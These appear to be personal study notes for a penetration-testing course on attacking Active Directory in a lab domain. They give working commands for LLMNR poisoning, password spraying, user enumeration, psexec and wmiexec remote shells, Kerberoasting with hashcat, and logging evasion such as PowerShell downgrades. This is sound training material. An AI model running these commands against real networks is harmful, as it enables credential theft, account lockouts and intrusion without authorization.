+- **On Windows:** Use a tool like **Inveigh**, as covered in the "LLMNR/NBT-NS Poisoning - from Windows" section. If you run `Inveigh.exe` or `Invoke-Inveigh` and immediately start seeing name resolution requests and capturing hashes, the network is vulnerable.
+- **On Linux:** Use a tool like **Responder**. If you run it and it captures authentication hashes, you've confirmed the vulnerability.
+
+If these tools successfully capture hashes, it proves that:
+
+- Hosts on the network are using LLMNR/NBT-NS for name resolution.
+- These protocols are not disabled.
+- You can successfully poison responses and trick clients into authenticating to you.
+
+### 2. Passive Network Monitoring
+
+You can passively listen to network traffic to see if the protocols are in use.
+
+- Use a network analyzer like **Wireshark** or **tcpdump**.
+- Filter for traffic on the ports used by these protocols:
+    - **LLMNR:** `UDP port 5355`
+    - **NBT-NS:** `UDP port 137`
+
+If you see broadcast or multicast traffic on these ports from various hosts, it means the protocols are active on the network and likely vulnerable to poisoning.
+
+### 3. Host-Level Configuration Check
+
+You can check the configuration of an individual Windows host to see if it has these protocols enabled. The "Remediation" part of this section gives us the clues.
+
+- **To check for LLMNR:**
+    
+    - Open the Local Group Policy Editor (`gpedit.msc`).
+    - Navigate to `Computer Configuration -> Administrative Templates -> Network -> DNS Client`.
+    - Check the status of "**Turn off multicast name resolution**". If it is "Not Configured" or "Disabled", then LLMNR is enabled and the host is vulnerable.
+- **To check for NBT-NS:**
+    
+    - Open your network adapter's properties.
+    - Go to `Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Advanced -> WINS` tab.
+    - Look at the "NetBIOS setting". If "**Disable NetBIOS over TCP/IP**" is not selected, then NBT-NS is enabled.
+
+In summary, the easiest and most definitive way for a penetration tester to check for vulnerability is to run a tool like **Inveigh** or **Responder**. If you capture hashes, the network is vulnerable.
+
+
+## Password Spraying
+
+Password spraying is an important method and technique of accesing systems and services by targeting multiple accounts with common passwords. This way the risk of locking out accounts is lower. Even the lowest privileged user withing the Domain can be useful in moving further through the domain. 
+
+For password spraying we would first need good username list. We can get one from github for most common usernames. for example jsmith.txt one. We can also use some scrapers an pull names from linkedin or use OSINT to find out more about our target through contact pages or pdf files. Another important thing is password policy. It can significantly increase our chances of succesfully performing password spraying since we have narrower choice of usernames and more knowledge about lockout.
+
+There is usually a timeout between attempting passwords so we have to take that into consideration.
+
+### Enumerating and retrieving password policies
+
+### Summary: Enumerating & Retrieving Password Policies
+
+This section details various methods for discovering an Active Directory domain's password policy, which is a critical step for planning attacks like password spraying. The techniques are divided based on whether you have credentials and the operating system you are attacking from.
+
+#### Key Enumeration Methods
+
+1. **Credentialed Enumeration (from Linux):**  
+    If you have valid domain credentials, you can directly query the password policy. The section demonstrates using `CrackMapExec` (NetExec now) with the `--pass-pol` flag to retrieve detailed policy information, including minimum password length, password history, lockout threshold, and complexity requirements.
+    
+2. **Uncredentialed Enumeration (from Linux):**  
+    Without credentials, enumeration relies on finding common misconfigurations:
+    
+    - **SMB NULL Sessions:** This legacy misconfiguration allows an unauthenticated user to connect to the IPC$ share and query domain information. Tools like `rpcclient`, `enum4linux`, and its modern successor `enum4linux-ng` can exploit this to dump the password policy.
+    - **LDAP Anonymous Binds:** Another legacy setting where unauthenticated users can perform LDAP queries. The `ldapsearch` tool can be used to query domain objects and filter for password policy attributes like `pwdHistoryLength` and `minPwdLength`.
+3. **Enumeration from Windows:**
+    
+    - **With Credentials:** On a domain-joined machine, the built-in `net accounts` command provides a clean, readable summary of the password policy. For more detailed, object-oriented output, PowerShell tools like PowerView (`Get-DomainPolicy`) are extremely effective.
+    - **Without Credentials:** You can test for a NULL session from Windows using the `net use \\<HOST>\ipc$ "" /u:""` command. The section also shows common error codes you might receive when authentication fails, which can help diagnose if an account is disabled, locked out, or if the password is simply incorrect.
+
+#### Analyzing the Policy for Attacks
+
+Once the policy is retrieved, you must analyze it from an attacker's perspective. The section uses the `INLANEFREIGHT.LOCAL` domain as an example to highlight key attributes:
+
+- **Minimum Password Length (8):** A low minimum length increases the chances of weak, guessable passwords.
+- **Account Lockout Threshold (5):** This tells you how many bad password attempts you can make before an account is locked. A threshold of 5 allows for 2-3 "safe" guesses during a password spray.
+- **Lockout Duration (30 minutes):** This indicates how long a locked account will remain inaccessible. Knowing this helps time subsequent spray attempts to avoid causing a denial-of-service condition.
+- **Password Complexity (Enabled):** While it sounds secure, this often just means users add a capital letter, a number, and a special character to a common word (e.g., `Summer2024!`), which is still highly susceptible to password spraying.
+
+The primary takeaway is that a "weak" policy (low length, high lockout threshold) makes password spraying a highly effective and relatively low-risk attack vector. The section concludes with a critical warning: **never lock out user accounts**. If the policy is unknown, be extremely cautious and limit password guesses to one or two attempts over a long period.
+
+
+
+## Password Spraying - Making a target user list
+
+To be able to perform a spraying attack we need to be able to perform it on some account or computer. THat is why we first need a list of user names. Valid ones. We can  get this list of users in a couple of ways depending if we have access to active directory aka we are inside or if we do not have credentials or null SMB session. There we can use tools like kerbrute or crackmapexec to search for valid usernames with predefined lists or we can make our own.
+
+If we are talking about already posessing credentials or there is a SMB NULL session that doesn't require password then it is much easier. We can also use LDAP anonymous bind to query LDAP anonymously. We can use credentials we obtained somewhere else somehow. 
+
+With having these credentails or null session of smb, we can enumerate password policy which can help us a lot in narrowing down user names and helping us making our own list with set of rules. Password policy can also contain rules for account lockout so  we have to be vary of that.
+
+For SMB NULL sessions some tools that we can use are num4linux, rpcclient, crackmapexec.
+
+for example this command:
+
+```bash
+enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+this command would give us list of user names. cut command is just to remove user prefix and something afterwards of actual usernames.
+
+we can also use rpcclient:
+
+```bash
+rpcclient -U "" -N 172.16.5.5
+```
+
+-U stands for null session so no user and -N is for no password.
+there we can use **enumdomusers** to get userlist
+
+
+**using ldap search**
+
+```bash
+grcic550@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+If we do not have credentials then we can use Kerbrute, It works in a way that it sends a TGT to a KDC  without Kerberos Pre-Authentication and if KDC returns PRINCIPAL UNKNOWN than there is no such user, but if it returns asking for Kerberos Pre-Authentication that means that user was accepted and that user exists. This attempts are not logged since there is no Pre-Authentication happening. When performing password spraying that is another case.
+
+```bash
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt
+```
+
+
+## Internal password spraying from linux
+
+Once we have a valid usernames list then we can perform password spraying attack. We can do this multiple ways with multiple tools.
+
+We can use **rpcclient**
+
+Here response with Authority Name means successful login so we can type command as this:
+
+```bash
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done 
+```
+
+We can also use kerbrute and crackmapexec:
+
+kerbrute:
+
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+```
+
+crackmapexec:
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
+```
+
+**Key Concepts:**
+
+- **Password Spraying:** An attack method where a single password (or a small list of common passwords) is tried against many different user accounts. This is done to avoid triggering account lockout policies that typically activate after multiple failed logins for a single user.
+- **Local Administrator Password Reuse:** A common misconfiguration where the same password for a local administrator account is used across multiple workstations and servers. This allows an attacker who compromises one machine's local admin account to potentially gain administrative access to many others.
+
+**Practical Application:**
+
+- **Tools for Domain Spraying:** The section demonstrates three tools for password spraying against domain accounts from a Linux host:
+    - `rpcclient`: Uses a Bash `for` loop to iterate through a user list, identifying successful logins by filtering for the `Authority Name` in the output.
+    - `kerbrute`: Uses the `passwordspray` command to efficiently test credentials against Kerberos.
+    - `crackmapexec`: A versatile tool that can test a list of users against a single password over SMB, with successful logins marked by a `[+]`.
+- **Local Admin Spraying:** `crackmapexec` can be used to spray a compromised local administrator's NTLM hash across an entire subnet. The `--local-auth` flag is critical to prevent domain account lockouts by ensuring it only attempts a local login on each machine.
+
+**Watch Out For:**
+
+- **Account Lockouts:** Standard password spraying against domain accounts can still cause lockouts if not done carefully. The goal is "low and slow."
+- **Noise:** Spraying an entire subnet with `crackmapexec` is a very "noisy" technique that will be easily detected by most security monitoring solutions. It is not suitable for stealthy operations.
+- **Remediation:** The use of Microsoft's **LAPS (Local Administrator Password Solution)** is mentioned as an effective defense against local administrator password reuse.
+
+# Internal Password Spraying - from Windows
+
+There is a great tool for password spraying from windows **DomainPasswordSpray** tool is great for this purpose.
+
+we can use it like this:
+
+```powershell
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+there are multiple ways to prevent this kind of events from happening like passwords leaking through password spraying attempts.
+
+first one would be multi factor authentication. this is type of authentication that requires at least two factors from different categories like password and biometrics, or OTP(ONE TIME PASSWORD) or text message. That is extremely hard for hacker to get a hold on but not imposible. This type may prevent accessing the computer or better say target but it may still reveal credentails that can be used elsewhere.
+
+also restricted access should be implemented and better password selection. our client or the administrator should also worry about DDOS attacks like intentionally missing passwords and locking down accounts which can bring down multiple users and stop work.
+
+logging should be enabled to see and alert if there are any susspicions about logging on to the service. if there are a lot logon attempts and a lot of them failed in a short period of time, that could be a good indicator.
+
+also the same should be done for kerberos pre-authentication, since there also can users be enumerated.
+
+# Enumerating Security Controls
+
+**Key Concepts:**
+
+- **Post-Foothold Reconnaissance:** After gaining initial access, it's critical to identify security controls to choose the right tools and avoid detection while enumerating Active Directory.
+- **Windows Defender:** Microsoft's built-in antivirus. Check its status with the PowerShell cmdlet:
+    - `Get-MpComputerStatus` (Look for `RealTimeProtectionEnabled`)
+- **AppLocker:** An application whitelisting solution. Enumerate its rules to find bypasses:
+    - `Get-AppLockerPolicy -Effective`
+- **PowerShell Constrained Language Mode:** A restricted PowerShell mode that limits attack capabilities. Check the current mode with:
+    - `$ExecutionContext.SessionState.LanguageMode`
+- **LAPS (Local Administrator Password Solution):** A tool that randomizes local admin passwords. Enumerate misconfigurations to find users who can read these passwords:
+    - `Find-LAPSDelegatedGroups`
+    - `Find-AdmPwdExtendedRights`
+    - `Get-LAPSComputers`
+
+**Practical Application:**  
+These techniques are used to understand the defensive landscape of the target network. By identifying active protections, a penetration tester can adapt their strategy, modify tools, or use "living off the land" binaries (LOLbins) to operate stealthily and effectively.
+
+# Credentialed Enumeration - from Linux
+
+**Scenario Credentials:**
+
+- **User:** `forend`
+- **Password:** `Klmcargo2`
+- **Domain:** `INLANEFREIGHT.LOCAL`
+- **Domain Controller IP:** `172.16.5.5`
+
+---
+
+### 1. CrackMapExec (CME) / NetExec
+
+- **What it is:** A powerful post-exploitation tool for assessing AD. It automates enumeration and exploitation over various protocols like SMB, WinRM, and SSH. It's excellent for quickly gathering information across multiple hosts.
+    
+- **How to Use It (SMB Protocol):**
+    
+    - **Enumerate Domain Users:**
+        
+        ```bash
+        sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+        ```
+        
+        _This command authenticates to the Domain Controller and dumps a list of all domain users, including useful attributes like `badPwdCount`._
+        
+    - **Enumerate Domain Groups:**
+        
+        ```bash
+        sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+        ```
+        
+        _Lists all domain groups and their member counts. This helps identify high-privilege groups like `Domain Admins` or `Backup Operators`._
+        
+    - **Find Logged-On Users:**
+        
+        ```bash
+        sudo crackmapexec smb <TARGET_IP> -u forend -p Klmcargo2 --loggedon-users
+        ```
+        
+        _Queries a target host to see which users currently have active sessions. This is key for "user hunting" to find where privileged accounts are active._
+        
+    - **Enumerate Network Shares:**
+        
+        ```bash
+        sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+        ```
+        
+        _Lists all SMB shares on a host and shows your access level (e.g., READ, WRITE). Look for non-standard shares that might contain sensitive data._
+        
+
+---
+
+### 2. SMBMap
+
+- **What it is:** A specialized tool for enumerating SMB shares. It focuses on listing shares, checking permissions, and exploring their contents.
+    
+- **How to Use It:**
+    
+    - **Check Share Access:**
+        
+        ```bash
+        smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+        ```
+        
+        _Connects to the target and provides a clean list of all shares and your permissions for each one._
+        
+    - **Recursively List Share Contents:**
+        
+        ```bash
+        smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares'
+        ```
+        
+        _The `-R` flag recursively lists all files and folders within a specified share, allowing you to map out its entire contents._
+        
+
+---
+
+### 3. rpcclient
+
+- **What it is:** A utility for interacting with Windows hosts via MS-RPC. It provides an interactive prompt to query the domain for detailed information about users, groups, and other objects.
+    
+- **How to Use It:**
+    
+    - **Connect Interactively:**
+        
+        ```bash
+        rpcclient -U 'forend' -p 'Klmcargo2' 172.16.5.5
+        ```
+        
+        _Establishes an authenticated connection and drops you into an `rpcclient $>` prompt._
+        
+    - **Enumerate Users and RIDs:**
+        
+        ```bash
+        rpcclient $> enumdomusers
+        ```
+        
+        _Lists all domain users along with their unique Relative Identifier (RID), which is like a user ID number._
+        
+    - **Query User Details by RID:**
+        
+        ```bash
+        rpcclient $> queryuser 0x457
+        ```
+        
+        _Retrieves detailed information (full name, logon times, password policy info) for a user based on their RID._
+        
+
+---
+
+### 4. Impacket Toolkit
+
+- **What it is:** A collection of Python scripts for working with network protocols. For this section, we focus on tools for remote command execution.
+    
+- **How to Use It:**
+    
+    - **psexec.py (Remote Shell as SYSTEM):**
+        
+        ```bash
+        psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+        ```
+        
+        _Requires local administrator credentials on the target. It creates a remote service to provide a fully interactive shell with `SYSTEM` privileges._
+        
+    - **wmiexec.py (Stealthier Remote Shell):**
+        
+        ```bash
+        wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+        ```
+        
+        _Also requires local admin credentials. It uses WMI to execute commands, which is stealthier as it doesn't drop files on the target. The shell is semi-interactive and runs as the user you authenticated with, not `SYSTEM`._
+        
+
+---
+
+### 5. Windapsearch
+
+- **What it is:** A Python script that performs enumeration using LDAP queries. It's great for quickly finding privileged users and groups.
+    
+- **How to Use It:**
+    
+    - **Find Domain Admins:**
+        
+        ```bash
+        python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+        ```
+        
+        _Runs a specific LDAP query to list all members of the `Domain Admins` group._
+        
+    - **Find All Privileged Users (Recursive):**
+        
+        ```bash
+        python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+        ```
+        
+        _Searches for members of all default privileged groups and recursively checks for nested group memberships, which can reveal users with unexpected privileges._
+        
+
+---
+
+### 6. BloodHound.py
+
+- **What it is:** The Python-based data collector (or "ingestor") for BloodHound. It gathers vast amounts of data about AD objects and their relationships.
+    
+- **How to Use It:**
+    
+    - **Collect Data:**
+        
+        ```bash
+        sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+        ```
+        
+        _The `-c all` flag tells the ingestor to collect everything: users, groups, computers, sessions, ACLs, GPOs, etc. It saves the output as several `.json` files._
+        
+    - **Analyze Data:**
+        
+        1. Start the Neo4j database: `sudo neo4j start`
+        2. Launch the BloodHound GUI: `bloodhound`
+        3. Zip the collected data: `zip -r data.zip *.json`
+        4. Upload the `data.zip` file to the GUI to visualize relationships and find attack paths to high-value targets like Domain Admins.
+
+in this part I experimented with ligolo-ng since I wanted to use bloodhound on my machine and not target. setup for ligolo-ng and how to use it is located in seperate file named ligolo-ng setup.
+
+!!! It is extremely important to remember that it is hard to remember this much stupp so there is very usefull interactive cheetsheet for this part and specifically Active Directory part:
+https://wadcoms.github.io/
+
+
+## Credentialed Enumeration - From Windows
+
+**Key Concepts:**
+
+- **Situational Awareness:** The primary objective is to understand the domain's structure, including trusts, users, groups, computers, and permissions.
+- **Built-in vs. Third-Party Tools:** The section introduces both native Windows tools (like the ActiveDirectory PowerShell module) and popular third-party tools (like PowerView, Snaffler, and BloodHound/SharpHound). Using built-in tools can be stealthier.
+- **Data Pillaging:** A key activity is enumerating file shares to find sensitive data like passwords, configuration files, or SSH keys that can be used to escalate privileges.
+- **Attack Path Identification:** Tools like PowerView and BloodHound are used to find specific misconfigurations, such as excessive local admin rights, accounts vulnerable to Kerberoasting (those with SPNs), and complex attack paths involving group memberships and permissions.
+
+**Practical Application:**  
+The techniques in this section are used to turn a low-privilege domain user account into a comprehensive map of the domain's weaknesses. An attacker would use these tools to find the quickest path to Domain Admin, identify sensitive data on file shares, or discover trust relationships that can be abused to move into other domains.
+
+**Watch Out For:**
+
+- **Data Overload:** Tools like Snaffler and BloodHound can generate a massive amount of data. It's crucial to output results to a file and have a systematic way to analyze them.
+- **Tool Footprint:** Dropping tools onto a target system leaves a forensic footprint. You must document all files transferred and be prepared to clean them up after the engagement.
+
+---
+
+### Command Explanations
+
+Here is a breakdown of the commands used in this section, grouped by the tool.
+
+#### ActiveDirectory PowerShell Module
+
+This module is a collection of cmdlets for administering AD. It's powerful because it's a built-in tool that may already be installed on servers, allowing for stealthier enumeration.
+
+- `Get-Module`
+    
+    - **Purpose:** Lists all PowerShell modules currently loaded in your session.
+    - **Use Case:** To check if the `ActiveDirectory` module is available before trying to use its cmdlets.
+- `Import-Module ActiveDirectory`
+    
+    - **Purpose:** Loads the ActiveDirectory module into the current PowerShell session, making its cmdlets available.
+    - **Use Case:** This is the necessary first step before you can run any `Get-AD...` commands.
+- `Get-ADDomain`
+    
+    - **Purpose:** Retrieves detailed information about the current Active Directory domain.
+    - **Use Case:** Provides foundational information like the Domain SID, the FSMO role holders (PDC Emulator, RID Master), and any child domains.
+- `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
+    
+    - **Purpose:** Finds all user accounts that have a Service Principal Name (SPN) attribute configured.
+    - **Use Case:** This is a critical step for identifying accounts that may be vulnerable to a **Kerberoasting** attack.
+- `Get-ADTrust -Filter *`
+    
+    - **Purpose:** Enumerates all trust relationships the current domain has with other domains.
+    - **Use Case:** Helps you understand how the domain is connected to others, which is vital for planning attacks across domain and forest boundaries.
+- `Get-ADGroup -Filter * | select name`
+    
+    - **Purpose:** Lists the names of all groups within the domain.
+    - **Use Case:** Gives a quick overview of all available groups, which you can then investigate further.
+- `Get-ADGroup -Identity "Backup Operators"`
+    
+    - **Purpose:** Retrieves detailed properties for a single, specified group.
+    - **Use Case:** Used to get more information about a potentially interesting group, such as its SID and description.
+- `Get-ADGroupMember -Identity "Backup Operators"`
+    
+    - **Purpose:** Lists all members (users and groups) of a specified group.
+    - **Use Case:** Essential for understanding who has the privileges of a particular group. Finding a user in a high-privilege group like "Backup Operators" is a significant finding.
+
+#### PowerView / SharpView
+
+PowerView is a powerful PowerShell tool for AD enumeration. SharpView is its .NET counterpart, which can be useful when PowerShell usage is restricted.
+
+- `Import-Module .\PowerView.ps1`
+    
+    - **Purpose:** Loads the PowerView script into your session.
+- `Get-DomainUser -Identity mmorgan`
+    
+    - **Purpose:** Retrieves a comprehensive set of properties for a specific user.
+    - **Use Case:** Provides much more detail than standard tools, including password age, last logon, and group memberships.
+- `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
+    
+    - **Purpose:** Lists all members of the "Domain Admins" group. The `-Recurse` flag is crucial as it also enumerates members of any groups nested inside "Domain Admins," revealing effective permissions.
+    - **Use Case:** Uncovers all users who have Domain Admin rights, even indirectly.
+- `Get-DomainTrustMapping`
+    
+    - **Purpose:** Enumerates all domain trusts and presents them in a clear, mapped format.
+    - **Use Case:** Similar to `Get-ADTrust` but provides a slightly different output format for analyzing trust directions and types.
+- `Test-AdminAccess -ComputerName ACADEMY-EA-MS01`
+    
+    - **Purpose:** Checks if your current user has local administrator rights on a specified remote machine.
+    - **Use Case:** Quickly identifies machines where you can escalate privileges.
+- `Get-DomainUser -SPN`
+    
+    - **Purpose:** Finds domain users with a Service Principal Name (SPN) set.
+    - **Use Case:** An alternative to the `Get-ADUser` cmdlet for finding Kerberoastable accounts.
+- `.\SharpView.exe Get-DomainUser -Identity forend`
+    
+    - **Purpose:** The SharpView equivalent of PowerView's `Get-DomainUser` command, executed as a standalone program.
+    - **Use Case:** Useful for enumeration when you cannot load PowerShell scripts but can run executables.
+
+#### Snaffler
+
+Snaffler is a specialized tool for finding sensitive data on file shares across the domain.
+
+- `Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`
+    - **Purpose:** Executes Snaffler to scan the specified domain (`-d`) for readable shares and files containing sensitive information.
+    - **Switches:**
+        - `-s`: Prints results to the console.
+        - `-d`: Specifies the domain to target.
+        - `-o`: Outputs all findings to a log file.
+        - `-v data`: Sets the verbosity level to only show found files and shares, reducing noise.
+    - **Use Case:** Automates the tedious process of manually searching through network shares for credentials, private keys, and other valuable data.
+
+#### BloodHound / SharpHound
+
+SharpHound is the data collector for BloodHound, which visualizes AD object relationships to find attack paths.
+
+- `.\SharpHound.exe -c All --zipfilename ILFREIGHT`
+    - **Purpose:** Runs the SharpHound collector to gather AD data.
+    - **Switches:**
+        - `-c All`: Specifies using all available collection methods (Group, ACL, Session, etc.) for the most comprehensive data set.
+        - `--zipfilename`: Specifies the name of the output zip file that will contain the collected data.
+    - **Use Case:** This is the primary command to collect data from a Windows host for analysis in the BloodHound GUI.
+
+# Living Off the Land
+
+good cheetsheet for wmic:https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
+
+
+![[Pasted image 20260902171805.png]]
+user account control values
+
+"Living Off the Land" (LotL) is a technique used by penetration testers and attackers to perform enumeration and other actions using only the native, built-in tools available on the target system. This approach is stealthier than uploading custom tools, as it generates fewer alerts and blends in with normal administrative activity.
+
+#### **1. Basic Host & Network Reconnaissance**
+
+These commands provide a quick overview of the compromised host and its place in the network.
+
+- **Get Hostname:**
+    
+    ```powershell
+    hostname
+    ```
+    
+- **Get OS Version & Patch Level:**
+    
+    ```powershell
+    [System.Environment]::OSVersion.Version
+    wmic qfe get Caption,Description,HotFixID,InstalledOn
+    ```
+    
+- **Get Network Configuration:**
+    
+    ```powershell
+    ipconfig /all
+    ```
+    
+- **Get Domain Information (from CMD):**
+    
+    ```powershell
+    echo %USERDOMAIN%
+    echo %logonserver%
+    ```
+    
+- **All-in-One Command:** The `systeminfo` command provides a comprehensive summary of the host, reducing the number of commands executed and potential log entries.
+    
+    ```powershell
+    systeminfo
+    ```
+    
+
+#### **2. Harnessing PowerShell**
+
+PowerShell is a powerful framework for administration and, therefore, a prime tool for enumeration.
+
+- **Check Execution Policy:** See if you can run scripts.
+    
+    ```powershell
+    Get-ExecutionPolicy -List
+    ```
+    
+- **Bypass Execution Policy (for current process):**
+    
+    ```powershell
+    Set-ExecutionPolicy Bypass -Scope Process
+    ```
+    
+- **View PowerShell History:** May contain sensitive information like passwords.
+    
+    ```powershell
+    Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+    ```
+    
+- **OpSec Tactic: PowerShell Downgrade:** PowerShell versions 3.0 and newer have enhanced logging. Downgrading to version 2.0 can prevent your commands from being logged.
+    
+    ```powershell
+    powershell.exe -version 2
+    ```
+    
+    **Note:** The command to initiate the downgrade is still logged, which can alert a vigilant defender.
+
+#### **3. Checking Defenses**
+
+Understanding the host's defenses is crucial for planning next steps.
+
+- **Check Firewall Status:** Use `netsh` to see profiles and rules.
+    
+    ```powershell
+    netsh advfirewall show allprofiles
+    ```
+    
+- **Check Windows Defender Status (from CMD):**
+    
+    ```cmd
+    sc query windefend
+    ```
+    
+- **Get Detailed Defender Status (from PowerShell):**
+    
+    ```powershell
+    Get-MpComputerStatus
+    ```
+    
+
+#### **4. Network Enumeration**
+
+Discover other hosts and network segments accessible from the compromised machine.
+
+- **Check for Logged-in Users:** See if you are alone on the system.
+    
+    ```powershell
+    qwinsta
+    ```
+    
+- **View ARP Table:** Lists hosts the machine has recently communicated with on the local network.
+    
+    ```powershell
+    arp -a
+    ```
+    
+- **View Routing Table:** Identifies known networks and potential pivot points.
+    
+    ```powershell
+    route print
+    ```
+    
+
+#### **5. Windows Management Instrumentation (WMI)**
+
+Use the `wmic` utility to query detailed system and domain information.
+
+- **List Domain Information:**
+    
+    ```powershell
+    wmic ntdomain list /format:list
+    ```
+    
+- **List User Accounts (local and cached domain):**
+    
+    ```powershell
+    wmic useraccount list /format:list
+    ```
+    
+- **List Local Groups:**
+    
+    ```powershell
+    wmic group list /format:list
+    ```
+    
+
+#### **6. Net Commands**
+
+The `net` command suite is a classic tool for querying domain information. **Warning:** These commands are heavily monitored by EDR solutions.
+
+- **Get Domain Password Policy:**
+    
+    ```powershell
+    net accounts /domain
+    ```
+    
+- **List Domain Groups:**
+    
+    ```powershell
+    net group /domain
+    ```
+    
+- **List Members of a Domain Group:**
+    
+    ```powershell
+    net group "Domain Admins" /domain
+    ```
+    
+- **List All Domain Users:**
+    
+    ```powershell
+    net user /domain
+    ```
+    
+- **Get Details for a Specific Domain User:**
+    
+    ```powershell
+    net user <ACCOUNT_NAME> /domain
+    ```
+    
+- **OpSec Tactic:** Using `net1` instead of `net` may execute the same function while bypassing simple string-based detection rules.
+    
+    ```powershell
+    net1 user /domain
+    ```
+    
+
+#### **7. Dsquery & LDAP Filtering**
+
+`dsquery` is a command-line tool for finding Active Directory objects using LDAP queries.
+
+- **Find All Users:**
+    
+    ```powershell
+    dsquery user
+    ```
+    
+- **Find All Computers:**
+    
+    ```powershell
+    dsquery computer
+    ```
+    
+- **Wildcard Search (e.g., all objects in the Users container):**
+    
+    ```powershell
+    dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+    ```
+    
+- **Advanced LDAP Filtering:** Use filters to find objects with specific attributes. This example finds users who do not require a password (`PASSWD_NOTREQD`).
+    
+    ```powershell
+    dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
+    ```
+
+#### OID match strings
+
+OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
+
+1. `1.2.840.113556.1.4.803`
+
+When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
+
+2. `1.2.840.113556.1.4.804`
+
+When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
+
+3. `1.2.840.113556.1.4.1941`
+
+This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
+
+# useful tools impacket
+
+https://github.com/fortra/impacket/tree/master/examples
+
+# Kerberoasting - from Linux
+
+### **Section Summary: Kerberoasting - from Linux**
+
+#### **Key Concepts**
+
+- **Kerberoasting:** An attack technique used for lateral movement and privilege escalation in Active Directory. It targets service accounts that have a **Service Principal Name (SPN)** configured.
+- **Service Principal Name (SPN):** A unique identifier that links a service instance (like a SQL server) to a domain user account that runs it. This is often done because regular service accounts have network authentication limitations.
+- **Attack Logic:** Any authenticated domain user can request a Kerberos service ticket (TGS-REP) for any service in the domain. This ticket is encrypted with the NTLM hash of the service account's password. An attacker can take this ticket offline and attempt to crack it to recover the cleartext password.
+
+#### **Practical Application**
+
+The attack is performed from a Linux host using Impacket's `GetUserSPNs.py` script. The main prerequisite is a set of valid domain credentials (username/password or NTLM hash).
+
+**1. List SPNs:**  
+First, you can enumerate all user accounts with an SPN to identify potential targets.
+
+- **Command:**
+    
+    ```shell
+    GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
+    ```
+    
+- **Explanation:** This command queries the Domain Controller (`-dc-ip`) using the provided credentials (`<DOMAIN>/<USER>`) and lists all accounts with associated SPNs, along with their group memberships.
+
+**2. Request TGS Tickets:**  
+Once you identify interesting accounts (e.g., members of "Domain Admins"), you can request their TGS tickets.
+
+- **Command:**
+    
+    ```shell
+    GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile tickets.txt
+    ```
+    
+- **Explanation:** The `-request` flag tells the script to request the TGS tickets for all found SPNs. The `-outputfile` flag saves the tickets into a file (`tickets.txt`) in a format that password cracking tools can use.
+
+**3. Crack the Ticket Offline:**  
+With the ticket hash saved, you can use a tool like Hashcat to crack the password.
+
+- **Command:**
+    
+    ```shell
+    hashcat -m 13100 tickets.txt /path/to/wordlist.txt
+    ```
+    
+- **Explanation:** This command uses Hashcat with mode `-m 13100` (Kerberos 5, TGS-REP) to try and crack the password hashes in `tickets.txt` using a wordlist.
+
+#### **Watch Out For**
+
+- **Success is Not Guaranteed:** Cracking a TGS ticket can be time-consuming and may fail if the service account has a strong password. The value of a cracked password depends entirely on the privileges of that service account.
+- **Reporting:** Even if you can't crack a ticket, the existence of SPNs with weak password policies is a valid security finding. The risk level (High vs. Medium) depends on whether you successfully compromised an account.
+
+
+# Kerberoasting From Windows - CPTS Study Notes
+
+> Use only in authorized lab environments such as HTB or systems where you have explicit permission to test.
+
+## What Kerberoasting Is
+
+Kerberoasting is an Active Directory attack technique that targets service accounts with Service Principal Names (SPNs). An authenticated domain user can request Kerberos TGS tickets for these services. The ticket material can then be exported and tested offline against candidate passwords.
+
+## Key Workflow
+
+1. Enumerate SPNs in the domain.
+2. Identify user-backed service accounts and ignore ordinary computer accounts where appropriate.
+3. Request TGS tickets for selected SPNs.
+4. Extract or export the tickets.
+5. Convert tickets into a format supported by a password-auditing tool.
+6. Test the tickets offline against candidate passwords.
+7. Validate any recovered credentials and document the resulting access.
+
+## Semi-Manual Method
+
+### 1. Enumerate SPNs with `setspn.exe`
+
+```cmd
+setspn.exe -Q */*
+```
+
+This returns SPNs registered throughout the domain. Focus on SPNs associated with user service accounts rather than computer accounts.
+
